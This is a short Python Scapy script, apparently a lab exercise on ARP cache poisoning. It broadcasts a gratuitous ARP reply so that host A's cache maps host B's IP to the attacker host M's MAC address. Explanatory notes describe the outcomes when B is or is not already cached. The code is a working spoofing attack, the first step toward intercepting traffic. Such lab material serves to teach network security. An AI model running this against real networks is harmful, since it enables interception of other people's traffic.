from scapy.all import *

hostA_MAC = "02:42:0a:09:00:05"
hostB_MAC = "02:42:0a:09:00:06"
# hostM_MAC = "02:42:0a:09:00:69"
hostB_IP = "10.9.0.6"
hostA_IP = "10.9.0.5"

ePkt = Ether(dst="ff:ff:ff:ff:ff:ff")
aPkt = ARP(psrc=hostB_IP, pdst=hostB_IP, hwdst="ff:ff:ff:ff:ff:ff")
aPkt.op = 2 # 1 for ARP Request; 2 for ARP Reply

pkt = ePkt/aPkt
sendp(pkt)

'''
On host M, construct an ARP gratuitous packet, and use
it to map B's IP address to M's MAC address.

Scenario 1: B's IP is already in A's cache.
- B's MAC is changed to host M MAC.

Scenario 2: B's IP is not in A's cache.
- Nothing happens. A's ARP table doesn't change.

ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to
update outdated information on all the other machine's ARP cache. The gratuitous ARP packet has
the following characteristics:

- The source and destination IP addresses are the same, and they are the IP address of the host
issuing the gratuitous ARP.

- The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC
address (ff:ff:ff:ff:ff:ff).

- No reply is expected.

'''